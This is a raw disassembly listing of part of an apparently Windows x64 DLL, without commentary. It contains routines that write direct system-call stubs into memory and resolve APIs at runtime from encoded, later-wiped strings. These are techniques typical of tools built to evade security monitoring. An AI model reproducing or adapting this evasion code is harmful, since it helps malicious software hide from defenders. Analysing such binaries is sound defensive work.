   1800049c0:	48 89 0d f9 6d 3a 00 	mov    %rcx,0x3a6df9(%rip)        # 0x1803ab7c0
   1800049c7:	48 8b c8             	mov    %rax,%rcx
   1800049ca:	c7 00 4c 8b d1 b8    	movl   $0xb8d18b4c,(%rax)
   1800049d0:	44 89 68 04          	mov    %r13d,0x4(%rax)
   1800049d4:	66 c7 40 08 0f 05    	movw   $0x50f,0x8(%rax)
   1800049da:	c6 40 0a c3          	movb   $0xc3,0xa(%rax)
   1800049de:	48 89 05 e3 6d 3a 00 	mov    %rax,0x3a6de3(%rip)        # 0x1803ab7c8
   1800049e5:	c7 40 40 4c 8b d1 b8 	movl   $0xb8d18b4c,0x40(%rax)
   1800049ec:	66 c7 40 48 0f 05    	movw   $0x50f,0x48(%rax)
   1800049f2:	c6 40 4a c3          	movb   $0xc3,0x4a(%rax)
   1800049f6:	c7 07 4c 8b d1 b8    	movl   $0xb8d18b4c,(%rdi)
   1800049fc:	89 5f 04             	mov    %ebx,0x4(%rdi)
   1800049ff:	66 c7 47 08 0f 05    	movw   $0x50f,0x8(%rdi)
   180004a05:	c6 47 0a c3          	movb   $0xc3,0xa(%rdi)
   180004a09:	48 89 3d a8 6d 3a 00 	mov    %rdi,0x3a6da8(%rip)        # 0x1803ab7b8
   180004a10:	ff 15 b2 16 02 00    	call   *0x216b2(%rip)        # 0x1800260c8
   180004a16:	b2 01                	mov    $0x1,%dl
   180004a18:	eb 02                	jmp    0x180004a1c
   180004a1a:	32 d2                	xor    %dl,%dl
   180004a1c:	4c 8b bc 24 e0 01 00 	mov    0x1e0(%rsp),%r15
   180004a23:	00 
   180004a24:	33 c9                	xor    %ecx,%ecx
   180004a26:	4c 8b b4 24 d8 01 00 	mov    0x1d8(%rsp),%r14
   180004a2d:	00 
   180004a2e:	8b c1                	mov    %ecx,%eax
   180004a30:	4c 8b ac 24 d0 01 00 	mov    0x1d0(%rsp),%r13
   180004a37:	00 
   180004a38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180004a3f:	00 
   180004a40:	88 4c 05 87          	mov    %cl,-0x79(%rbp,%rax,1)
   180004a44:	48 ff c0             	inc    %rax
   180004a47:	48 83 f8 17          	cmp    $0x17,%rax
   180004a4b:	72 f3                	jb     0x180004a40
   180004a4d:	48 8b c1             	mov    %rcx,%rax
   180004a50:	88 4c 05 48          	mov    %cl,0x48(%rbp,%rax,1)
   180004a54:	48 ff c0             	inc    %rax
   180004a57:	48 83 f8 18          	cmp    $0x18,%rax
   180004a5b:	72 f3                	jb     0x180004a50
   180004a5d:	48 8b c1             	mov    %rcx,%rax
   180004a60:	88 4c 05 e3          	mov    %cl,-0x1d(%rbp,%rax,1)
   180004a64:	48 ff c0             	inc    %rax
   180004a67:	48 83 f8 13          	cmp    $0x13,%rax
   180004a6b:	72 f3                	jb     0x180004a60
   180004a6d:	48 8b c1             	mov    %rcx,%rax
   180004a70:	88 4c 05 78          	mov    %cl,0x78(%rbp,%rax,1)
   180004a74:	48 ff c0             	inc    %rax
   180004a77:	48 83 f8 18          	cmp    $0x18,%rax
   180004a7b:	72 f3                	jb     0x180004a70
   180004a7d:	48 8b c1             	mov    %rcx,%rax
   180004a80:	88 4c 05 b7          	mov    %cl,-0x49(%rbp,%rax,1)
   180004a84:	48 ff c0             	inc    %rax
   180004a87:	48 83 f8 17          	cmp    $0x17,%rax
   180004a8b:	72 f3                	jb     0x180004a80
   180004a8d:	0f 1f 00             	nopl   (%rax)
   180004a90:	c6 44 0d 12 00       	movb   $0x0,0x12(%rbp,%rcx,1)
   180004a95:	48 ff c1             	inc    %rcx
   180004a98:	48 83 f9 1a          	cmp    $0x1a,%rcx
   180004a9c:	72 f2                	jb     0x180004a90
   180004a9e:	33 c0                	xor    %eax,%eax
   180004aa0:	48 8d 7c 24 54       	lea    0x54(%rsp),%rdi
   180004aa5:	b9 14 00 00 00       	mov    $0x14,%ecx
   180004aaa:	f3 aa                	rep stos %al,(%rdi)
   180004aac:	0f b6 c2             	movzbl %dl,%eax
   180004aaf:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   180004ab6:	48 33 cc             	xor    %rsp,%rcx
   180004ab9:	e8 f2 a0 00 00       	call   0x18000ebb0
   180004abe:	48 81 c4 a0 01 00 00 	add    $0x1a0,%rsp
   180004ac5:	41 5c                	pop    %r12
   180004ac7:	5f                   	pop    %rdi
   180004ac8:	5e                   	pop    %rsi
   180004ac9:	5b                   	pop    %rbx
   180004aca:	5d                   	pop    %rbp
   180004acb:	c3                   	ret
   180004acc:	cc                   	int3
   180004acd:	cc                   	int3
   180004ace:	cc                   	int3
   180004acf:	cc                   	int3
   180004ad0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180004ad5:	55                   	push   %rbp
   180004ad6:	56                   	push   %rsi
   180004ad7:	57                   	push   %rdi
   180004ad8:	41 56                	push   %r14
   180004ada:	41 57                	push   %r15
   180004adc:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   180004ae3:	48 8b 05 16 45 3a 00 	mov    0x3a4516(%rip),%rax        # 0x1803a9000
   180004aea:	48 33 c4             	xor    %rsp,%rax
   180004aed:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   180004af4:	00 
   180004af5:	49 8b e8             	mov    %r8,%rbp
   180004af8:	8b f2                	mov    %edx,%esi
   180004afa:	48 8b d9             	mov    %rcx,%rbx
   180004afd:	48 8b 05 c4 6c 3a 00 	mov    0x3a6cc4(%rip),%rax        # 0x1803ab7c8
   180004b04:	48 85 c0             	test   %rax,%rax
   180004b07:	74 14                	je     0x180004b1d
   180004b09:	33 ff                	xor    %edi,%edi
   180004b0b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180004b10:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   180004b16:	ff d0                	call   *%rax
   180004b18:	e9 f1 00 00 00       	jmp    0x180004c0e
   180004b1d:	89 44 24 44          	mov    %eax,0x44(%rsp)
   180004b21:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004b24:	0f 11 44 24 44       	movups %xmm0,0x44(%rsp)
   180004b29:	89 44 24 54          	mov    %eax,0x54(%rsp)
   180004b2d:	c7 44 24 30 4d 00 50 	movl   $0x50004d,0x30(%rsp)
   180004b34:	00 
   180004b35:	c7 44 24 34 41 00 4a 	movl   $0x4a0041,0x34(%rsp)
   180004b3c:	00 
   180004b3d:	c7 44 24 38 4b 00 06 	movl   $0x6004b,0x38(%rsp)
   180004b44:	00 
   180004b45:	c7 44 24 3c 4d 00 46 	movl   $0x46004d,0x3c(%rsp)
   180004b4c:	00 
   180004b4d:	c7 44 24 40 47 00 2c 	movl   $0x2c0047,0x40(%rsp)
   180004b54:	00 
   180004b55:	66 0f 6f 0d 43 05 3a 	movdqa 0x3a0543(%rip),%xmm1        # 0x1803a50a0
   180004b5c:	00 
   180004b5d:	66 0f 6f 15 8b ff 39 	movdqa 0x39ff8b(%rip),%xmm2        # 0x1803a4af0
   180004b64:	00 
   180004b65:	33 c0                	xor    %eax,%eax
   180004b67:	0f 11 44 24 72       	movups %xmm0,0x72(%rsp)
   180004b6c:	48 89 84 24 82 00 00 	mov    %rax,0x82(%rsp)
   180004b73:	00 
   180004b74:	66 89 84 24 8a 00 00 	mov    %ax,0x8a(%rsp)
   180004b7b:	00 
   180004b7c:	0f 11 4c 24 58       	movups %xmm1,0x58(%rsp)
   180004b81:	f2 0f 11 54 24 68    	movsd  %xmm2,0x68(%rsp)
   180004b87:	66 0f c5 c2 04       	pextrw $0x4,%xmm2,%eax
   180004b8c:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   180004b91:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180004b96:	e8 25 99 00 00       	call   0x18000e4c0
   180004b9b:	48 8b c8             	mov    %rax,%rcx
   180004b9e:	ff 15 b4 15 02 00    	call   *0x215b4(%rip)        # 0x180026158
   180004ba4:	4c 8b c8             	mov    %rax,%r9
   180004ba7:	33 ff                	xor    %edi,%edi
   180004ba9:	48 85 c0             	test   %rax,%rax
   180004bac:	74 34                	je     0x180004be2
   180004bae:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   180004bb3:	e8 e8 93 00 00       	call   0x18000dfa0
   180004bb8:	48 8b d0             	mov    %rax,%rdx
   180004bbb:	49 8b c9             	mov    %r9,%rcx
   180004bbe:	ff 15 6c 15 02 00    	call   *0x2156c(%rip)        # 0x180026130
   180004bc4:	48 85 c0             	test   %rax,%rax
   180004bc7:	74 19                	je     0x180004be2
   180004bc9:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180004bce:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   180004bd4:	4c 8b c5             	mov    %rbp,%r8
   180004bd7:	8b d6                	mov    %esi,%edx
   180004bd9:	48 8b cb             	mov    %rbx,%rcx
   180004bdc:	ff d0                	call   *%rax
   180004bde:	8b d0                	mov    %eax,%edx
   180004be0:	eb 05                	jmp    0x180004be7
   180004be2:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   180004be7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180004bee:	00 00 
   180004bf0:	c6 44 3c 72 00       	movb   $0x0,0x72(%rsp,%rdi,1)
   180004bf5:	48 ff c7             	inc    %rdi
   180004bf8:	48 83 ff 1a          	cmp    $0x1a,%rdi
   180004bfc:	72 f2                	jb     0x180004bf0
   180004bfe:	48 8d 7c 24 44       	lea    0x44(%rsp),%rdi
   180004c03:	33 c0                	xor    %eax,%eax
   180004c05:	b9 14 00 00 00       	mov    $0x14,%ecx
   180004c0a:	f3 aa                	rep stos %al,(%rdi)
   180004c0c:	8b c2                	mov    %edx,%eax
   180004c0e:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   180004c15:	00 
   180004c16:	48 33 cc             	xor    %rsp,%rcx
   180004c19:	e8 92 9f 00 00       	call   0x18000ebb0
   180004c1e:	48 8b 9c 24 e8 00 00 	mov    0xe8(%rsp),%rbx
   180004c25:	00 
   180004c26:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   180004c2d:	41 5f                	pop    %r15
   180004c2f:	41 5e                	pop    %r14
   180004c31:	5f                   	pop    %rdi
   180004c32:	5e                   	pop    %rsi
   180004c33:	5d                   	pop    %rbp
   180004c34:	c3                   	ret
   180004c35:	cc                   	int3
   180004c36:	cc                   	int3
   180004c37:	cc                   	int3
   180004c38:	cc                   	int3
   180004c39:	cc                   	int3
   180004c3a:	cc                   	int3
   180004c3b:	cc                   	int3
   180004c3c:	cc                   	int3
   180004c3d:	cc                   	int3
   180004c3e:	cc                   	int3
   180004c3f:	cc                   	int3
   180004c40:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180004c45:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180004c4a:	55                   	push   %rbp
   180004c4b:	57                   	push   %rdi
   180004c4c:	41 56                	push   %r14
   180004c4e:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   180004c53:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   180004c5a:	48 8b 05 9f 43 3a 00 	mov    0x3a439f(%rip),%rax        # 0x1803a9000
   180004c61:	48 33 c4             	xor    %rsp,%rax
   180004c64:	48 89 45 3f          	mov    %rax,0x3f(%rbp)
   180004c68:	48 8b f9             	mov    %rcx,%rdi
   180004c6b:	48 8b 05 3e 6b 3a 00 	mov    0x3a6b3e(%rip),%rax        # 0x1803ab7b0
   180004c72:	48 85 c0             	test   %rax,%rax
   180004c75:	74 12                	je     0x180004c89
   180004c77:	45 33 c9             	xor    %r9d,%r9d
   180004c7a:	45 33 c0             	xor    %r8d,%r8d
   180004c7d:	ba 11 00 00 00       	mov    $0x11,%edx
   180004c82:	ff d0                	call   *%rax
   180004c84:	e9 e4 00 00 00       	jmp    0x180004d6d
   180004c89:	89 45 db             	mov    %eax,-0x25(%rbp)
   180004c8c:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004c8f:	0f 11 45 fb          	movups %xmm0,-0x5(%rbp)
   180004c93:	89 45 0b             	mov    %eax,0xb(%rbp)
   180004c96:	c7 45 e7 4d 00 50 00 	movl   $0x50004d,-0x19(%rbp)
   180004c9d:	c7 45 eb 41 00 4a 00 	movl   $0x4a0041,-0x15(%rbp)
   180004ca4:	c7 45 ef 4b 00 06 00 	movl   $0x6004b,-0x11(%rbp)
   180004cab:	c7 45 f3 4d 00 46 00 	movl   $0x46004d,-0xd(%rbp)
   180004cb2:	c7 45 f7 47 00 2c 00 	movl   $0x2c0047,-0x9(%rbp)
   180004cb9:	66 0f 6f 0d 1f 04 3a 	movdqa 0x3a041f(%rip),%xmm1        # 0x1803a50e0
   180004cc0:	00 
   180004cc1:	c7 45 d7 67 5c 47 53 	movl   $0x53475c67,-0x29(%rbp)
   180004cc8:	66 c7 45 db 56 5c    	movw   $0x5c56,-0x25(%rbp)
   180004cce:	33 c0                	xor    %eax,%eax
   180004cd0:	0f 11 45 26          	movups %xmm0,0x26(%rbp)
   180004cd4:	89 45 36             	mov    %eax,0x36(%rbp)
   180004cd7:	66 89 45 3a          	mov    %ax,0x3a(%rbp)
   180004cdb:	88 45 3c             	mov    %al,0x3c(%rbp)
   180004cde:	0f 11 4d 0f          	movups %xmm1,0xf(%rbp)
   180004ce2:	8b 45 d7             	mov    -0x29(%rbp),%eax
   180004ce5:	89 45 1f             	mov    %eax,0x1f(%rbp)
   180004ce8:	0f b7 45 db          	movzwl -0x25(%rbp),%eax
   180004cec:	66 89 45 23          	mov    %ax,0x23(%rbp)
   180004cf0:	c6 45 25 39          	movb   $0x39,0x25(%rbp)
   180004cf4:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   180004cf8:	e8 c3 97 00 00       	call   0x18000e4c0
   180004cfd:	48 8b c8             	mov    %rax,%rcx
   180004d00:	ff 15 52 14 02 00    	call   *0x21452(%rip)        # 0x180026158
   180004d06:	4c 8b c8             	mov    %rax,%r9
   180004d09:	48 85 c0             	test   %rax,%rax
   180004d0c:	74 2e                	je     0x180004d3c
   180004d0e:	48 8d 4d 0f          	lea    0xf(%rbp),%rcx
   180004d12:	e8 39 92 00 00       	call   0x18000df50
   180004d17:	48 8b d0             	mov    %rax,%rdx
   180004d1a:	49 8b c9             	mov    %r9,%rcx
   180004d1d:	ff 15 0d 14 02 00    	call   *0x2140d(%rip)        # 0x180026130
   180004d23:	48 85 c0             	test   %rax,%rax
   180004d26:	74 14                	je     0x180004d3c
   180004d28:	45 33 c9             	xor    %r9d,%r9d
   180004d2b:	45 33 c0             	xor    %r8d,%r8d
   180004d2e:	ba 11 00 00 00       	mov    $0x11,%edx
   180004d33:	48 8b cf             	mov    %rdi,%rcx
   180004d36:	ff d0                	call   *%rax
   180004d38:	8b d0                	mov    %eax,%edx
   180004d3a:	eb 05                	jmp    0x180004d41
   180004d3c:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   180004d41:	33 c0                	xor    %eax,%eax
   180004d43:	0f 1f 40 00          	nopl   0x0(%rax)
   180004d47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180004d4e:	00 00 
   180004d50:	c6 44 05 26 00       	movb   $0x0,0x26(%rbp,%rax,1)
   180004d55:	48 ff c0             	inc    %rax
   180004d58:	48 83 f8 17          	cmp    $0x17,%rax
   180004d5c:	72 f2                	jb     0x180004d50
   180004d5e:	48 8d 7d fb          	lea    -0x5(%rbp),%rdi
   180004d62:	33 c0                	xor    %eax,%eax
   180004d64:	b9 14 00 00 00       	mov    $0x14,%ecx
   180004d69:	f3 aa                	rep stos %al,(%rdi)
   180004d6b:	8b c2                	mov    %edx,%eax
   180004d6d:	48 8b 4d 3f          	mov    0x3f(%rbp),%rcx
   180004d71:	48 33 cc             	xor    %rsp,%rcx
   180004d74:	e8 37 9e 00 00       	call   0x18000ebb0
   180004d79:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   180004d80:	00 
   180004d81:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180004d85:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180004d89:	49 8b e3             	mov    %r11,%rsp
   180004d8c:	41 5e                	pop    %r14
   180004d8e:	5f                   	pop    %rdi
   180004d8f:	5d                   	pop    %rbp
   180004d90:	c3                   	ret
   180004d91:	cc                   	int3
   180004d92:	cc                   	int3
   180004d93:	cc                   	int3
   180004d94:	cc                   	int3
   180004d95:	cc                   	int3
   180004d96:	cc                   	int3
   180004d97:	cc                   	int3
   180004d98:	cc                   	int3
   180004d99:	cc                   	int3
   180004d9a:	cc                   	int3
   180004d9b:	cc                   	int3
   180004d9c:	cc                   	int3
   180004d9d:	cc                   	int3
   180004d9e:	cc                   	int3
   180004d9f:	cc                   	int3
   180004da0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180004da5:	55                   	push   %rbp
   180004da6:	56                   	push   %rsi
   180004da7:	57                   	push   %rdi
   180004da8:	41 56                	push   %r14
   180004daa:	41 57                	push   %r15
   180004dac:	48 8d 6c 24 c9       	lea    -0x37(%rsp),%rbp
   180004db1:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   180004db8:	48 8b 05 41 42 3a 00 	mov    0x3a4241(%rip),%rax        # 0x1803a9000
   180004dbf:	48 33 c4             	xor    %rsp,%rax
   180004dc2:	48 89 45 2f          	mov    %rax,0x2f(%rbp)
   180004dc6:	49 8b d8             	mov    %r8,%rbx
   180004dc9:	48 8b f9             	mov    %rcx,%rdi
   180004dcc:	48 8b 05 05 6a 3a 00 	mov    0x3a6a05(%rip),%rax        # 0x1803ab7d8
   180004dd3:	48 85 c0             	test   %rax,%rax
   180004dd6:	74 12                	je     0x180004dea
   180004dd8:	ba 1f 00 00 00       	mov    $0x1f,%edx
   180004ddd:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180004de3:	ff d0                	call   *%rax
   180004de5:	e9 d3 00 00 00       	jmp    0x180004ebd
   180004dea:	89 45 cb             	mov    %eax,-0x35(%rbp)
   180004ded:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004df0:	0f 11 45 eb          	movups %xmm0,-0x15(%rbp)
   180004df4:	89 45 fb             	mov    %eax,-0x5(%rbp)
   180004df7:	c7 45 d7 4d 00 50 00 	movl   $0x50004d,-0x29(%rbp)
   180004dfe:	c7 45 db 41 00 4a 00 	movl   $0x4a0041,-0x25(%rbp)
   180004e05:	c7 45 df 4b 00 06 00 	movl   $0x6004b,-0x21(%rbp)
   180004e0c:	c7 45 e3 4d 00 46 00 	movl   $0x46004d,-0x1d(%rbp)
   180004e13:	c7 45 e7 47 00 2c 00 	movl   $0x2c0047,-0x19(%rbp)
   180004e1a:	66 0f 6f 0d be 02 3a 	movdqa 0x3a02be(%rip),%xmm1        # 0x1803a50e0
   180004e21:	00 
   180004e22:	c7 45 c7 63 46 5a 55 	movl   $0x555a4663,-0x39(%rbp)
   180004e29:	c7 45 cb 52 4b 4a 3a 	movl   $0x3a4a4b52,-0x35(%rbp)
   180004e30:	33 c0                	xor    %eax,%eax
   180004e32:	0f 11 45 17          	movups %xmm0,0x17(%rbp)
   180004e36:	48 89 45 27          	mov    %rax,0x27(%rbp)
   180004e3a:	0f 11 4d ff          	movups %xmm1,-0x1(%rbp)
   180004e3e:	f2 0f 10 45 c7       	movsd  -0x39(%rbp),%xmm0
   180004e43:	f2 0f 11 45 0f       	movsd  %xmm0,0xf(%rbp)
   180004e48:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   180004e4c:	e8 6f 96 00 00       	call   0x18000e4c0
   180004e51:	48 8b c8             	mov    %rax,%rcx
   180004e54:	ff 15 fe 12 02 00    	call   *0x212fe(%rip)        # 0x180026158
   180004e5a:	4c 8b c8             	mov    %rax,%r9
   180004e5d:	48 85 c0             	test   %rax,%rax
   180004e60:	74 31                	je     0x180004e93
   180004e62:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   180004e66:	e8 95 90 00 00       	call   0x18000df00
   180004e6b:	48 8b d0             	mov    %rax,%rdx
   180004e6e:	49 8b c9             	mov    %r9,%rcx
   180004e71:	ff 15 b9 12 02 00    	call   *0x212b9(%rip)        # 0x180026130
   180004e77:	48 85 c0             	test   %rax,%rax
   180004e7a:	74 17                	je     0x180004e93
   180004e7c:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180004e82:	4c 8b c3             	mov    %rbx,%r8
   180004e85:	ba 1f 00 00 00       	mov    $0x1f,%edx
   180004e8a:	48 8b cf             	mov    %rdi,%rcx
   180004e8d:	ff d0                	call   *%rax
   180004e8f:	8b d0                	mov    %eax,%edx
   180004e91:	eb 05                	jmp    0x180004e98
   180004e93:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   180004e98:	33 c0                	xor    %eax,%eax
   180004e9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180004ea0:	c6 44 05 17 00       	movb   $0x0,0x17(%rbp,%rax,1)
   180004ea5:	48 ff c0             	inc    %rax
   180004ea8:	48 83 f8 18          	cmp    $0x18,%rax
   180004eac:	72 f2                	jb     0x180004ea0
   180004eae:	48 8d 7d eb          	lea    -0x15(%rbp),%rdi
   180004eb2:	33 c0                	xor    %eax,%eax
   180004eb4:	b9 14 00 00 00       	mov    $0x14,%ecx
   180004eb9:	f3 aa                	rep stos %al,(%rdi)
   180004ebb:	8b c2                	mov    %edx,%eax
   180004ebd:	48 8b 4d 2f          	mov    0x2f(%rbp),%rcx
   180004ec1:	48 33 cc             	xor    %rsp,%rcx
   180004ec4:	e8 e7 9c 00 00       	call   0x18000ebb0
   180004ec9:	48 8b 9c 24 d8 00 00 	mov    0xd8(%rsp),%rbx
   180004ed0:	00 
   180004ed1:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   180004ed8:	41 5f                	pop    %r15
   180004eda:	41 5e                	pop    %r14
   180004edc:	5f                   	pop    %rdi
   180004edd:	5e                   	pop    %rsi
   180004ede:	5d                   	pop    %rbp
   180004edf:	c3                   	ret
   180004ee0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180004ee5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180004eea:	55                   	push   %rbp
   180004eeb:	57                   	push   %rdi
   180004eec:	41 56                	push   %r14
   180004eee:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   180004ef3:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   180004efa:	48 8b 05 ff 40 3a 00 	mov    0x3a40ff(%rip),%rax        # 0x1803a9000
   180004f01:	48 33 c4             	xor    %rsp,%rax
   180004f04:	48 89 45 37          	mov    %rax,0x37(%rbp)
   180004f08:	48 8b f9             	mov    %rcx,%rdi
   180004f0b:	48 8b 05 ae 68 3a 00 	mov    0x3a68ae(%rip),%rax        # 0x1803ab7c0
   180004f12:	48 85 c0             	test   %rax,%rax
   180004f15:	74 0c                	je     0x180004f23
   180004f17:	ba 01 00 00 00       	mov    $0x1,%edx
   180004f1c:	ff d0                	call   *%rax
   180004f1e:	e9 ca 00 00 00       	jmp    0x180004fed
   180004f23:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004f26:	0f 11 45 fb          	movups %xmm0,-0x5(%rbp)
   180004f2a:	89 45 0b             	mov    %eax,0xb(%rbp)
   180004f2d:	c7 45 e7 4d 00 50 00 	movl   $0x50004d,-0x19(%rbp)
   180004f34:	c7 45 eb 41 00 4a 00 	movl   $0x4a0041,-0x15(%rbp)
   180004f3b:	c7 45 ef 4b 00 06 00 	movl   $0x6004b,-0x11(%rbp)
   180004f42:	c7 45 f3 4d 00 46 00 	movl   $0x46004d,-0xd(%rbp)
   180004f49:	c7 45 f7 47 00 2c 00 	movl   $0x2c0047,-0x9(%rbp)
   180004f50:	66 0f 6f 0d f8 00 3a 	movdqa 0x3a00f8(%rip),%xmm1        # 0x1803a5050
   180004f57:	00 
   180004f58:	66 c7 45 d7 40 47    	movw   $0x4740,-0x29(%rbp)
   180004f5e:	33 c0                	xor    %eax,%eax
   180004f60:	0f 11 45 22          	movups %xmm0,0x22(%rbp)
   180004f64:	66 89 45 32          	mov    %ax,0x32(%rbp)
   180004f68:	88 45 34             	mov    %al,0x34(%rbp)
   180004f6b:	0f 11 4d 0f          	movups %xmm1,0xf(%rbp)
   180004f6f:	0f b7 45 d7          	movzwl -0x29(%rbp),%eax
   180004f73:	66 89 45 1f          	mov    %ax,0x1f(%rbp)
   180004f77:	c6 45 21 35          	movb   $0x35,0x21(%rbp)
   180004f7b:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   180004f7f:	e8 3c 95 00 00       	call   0x18000e4c0
   180004f84:	48 8b c8             	mov    %rax,%rcx
   180004f87:	ff 15 cb 11 02 00    	call   *0x211cb(%rip)        # 0x180026158
   180004f8d:	4c 8b c8             	mov    %rax,%r9
   180004f90:	48 85 c0             	test   %rax,%rax
   180004f93:	74 28                	je     0x180004fbd
   180004f95:	48 8d 4d 0f          	lea    0xf(%rbp),%rcx
   180004f99:	e8 12 8f 00 00       	call   0x18000deb0
   180004f9e:	48 8b d0             	mov    %rax,%rdx
   180004fa1:	49 8b c9             	mov    %r9,%rcx
   180004fa4:	ff 15 86 11 02 00    	call   *0x21186(%rip)        # 0x180026130
   180004faa:	48 85 c0             	test   %rax,%rax
   180004fad:	74 0e                	je     0x180004fbd
   180004faf:	ba 01 00 00 00       	mov    $0x1,%edx
   180004fb4:	48 8b cf             	mov    %rdi,%rcx
   180004fb7:	ff d0                	call   *%rax
   180004fb9:	8b d0                	mov    %eax,%edx
   180004fbb:	eb 05                	jmp    0x180004fc2
   180004fbd:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   180004fc2:	33 c0                	xor    %eax,%eax
   180004fc4:	0f 1f 40 00          	nopl   0x0(%rax)
   180004fc8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180004fcf:	00 
   180004fd0:	c6 44 05 22 00       	movb   $0x0,0x22(%rbp,%rax,1)
   180004fd5:	48 ff c0             	inc    %rax
   180004fd8:	48 83 f8 13          	cmp    $0x13,%rax
   180004fdc:	72 f2                	jb     0x180004fd0
   180004fde:	48 8d 7d fb          	lea    -0x5(%rbp),%rdi
   180004fe2:	33 c0                	xor    %eax,%eax
   180004fe4:	b9 14 00 00 00       	mov    $0x14,%ecx
   180004fe9:	f3 aa                	rep stos %al,(%rdi)
   180004feb:	8b c2                	mov    %edx,%eax
   180004fed:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   180004ff1:	48 33 cc             	xor    %rsp,%rcx
   180004ff4:	e8 b7 9b 00 00       	call   0x18000ebb0
   180004ff9:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   180005000:	00 
   180005001:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180005005:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180005009:	49 8b e3             	mov    %r11,%rsp
   18000500c:	41 5e                	pop    %r14
   18000500e:	5f                   	pop    %rdi
   18000500f:	5d                   	pop    %rbp
   180005010:	c3                   	ret
   180005011:	cc                   	int3
   180005012:	cc                   	int3
   180005013:	cc                   	int3
   180005014:	cc                   	int3
   180005015:	cc                   	int3
   180005016:	cc                   	int3
   180005017:	cc                   	int3
   180005018:	cc                   	int3
   180005019:	cc                   	int3
   18000501a:	cc                   	int3
   18000501b:	cc                   	int3
   18000501c:	cc                   	int3
   18000501d:	cc                   	int3
   18000501e:	cc                   	int3
   18000501f:	cc                   	int3
   180005020:	40 55                	rex push %rbp
   180005022:	53                   	push   %rbx
   180005023:	56                   	push   %rsi
   180005024:	57                   	push   %rdi
   180005025:	41 54                	push   %r12
   180005027:	41 56                	push   %r14
   180005029:	41 57                	push   %r15
   18000502b:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   180005030:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   180005037:	48 8b 05 c2 3f 3a 00 	mov    0x3a3fc2(%rip),%rax        # 0x1803a9000
   18000503e:	48 33 c4             	xor    %rsp,%rax
   180005041:	48 89 45 1f          	mov    %rax,0x1f(%rbp)
   180005045:	49 8b f1             	mov    %r9,%rsi
   180005048:	41 8b d8             	mov    %r8d,%ebx
   18000504b:	48 89 4d b7          	mov    %rcx,-0x49(%rbp)
   18000504f:	48 89 55 e7          	mov    %rdx,-0x19(%rbp)
   180005053:	ff 15 cf 0f 02 00    	call   *0x20fcf(%rip)        # 0x180026028
   180005059:	4c 8b f0             	mov    %rax,%r14
   18000505c:	48 8b 3d 55 67 3a 00 	mov    0x3a6755(%rip),%rdi        # 0x1803ab7b8
   180005063:	48 85 ff             	test   %rdi,%rdi
   180005066:	74 1c                	je     0x180005084
   180005068:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000506d:	44 8b cb             	mov    %ebx,%r9d
   180005070:	4c 8d 45 e7          	lea    -0x19(%rbp),%r8
   180005074:	48 8d 55 b7          	lea    -0x49(%rbp),%rdx
   180005078:	48 8b c8             	mov    %rax,%rcx
   18000507b:	ff d7                	call   *%rdi
   18000507d:	8b d0                	mov    %eax,%edx
   18000507f:	e9 07 01 00 00       	jmp    0x18000518b
   180005084:	33 c0                	xor    %eax,%eax
   180005086:	89 45 ab             	mov    %eax,-0x55(%rbp)
   180005089:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000508c:	0f 11 45 d3          	movups %xmm0,-0x2d(%rbp)
   180005090:	89 45 e3             	mov    %eax,-0x1d(%rbp)
   180005093:	c7 45 bf 4d 00 50 00 	movl   $0x50004d,-0x41(%rbp)
   18000509a:	c7 45 c3 41 00 4a 00 	movl   $0x4a0041,-0x3d(%rbp)
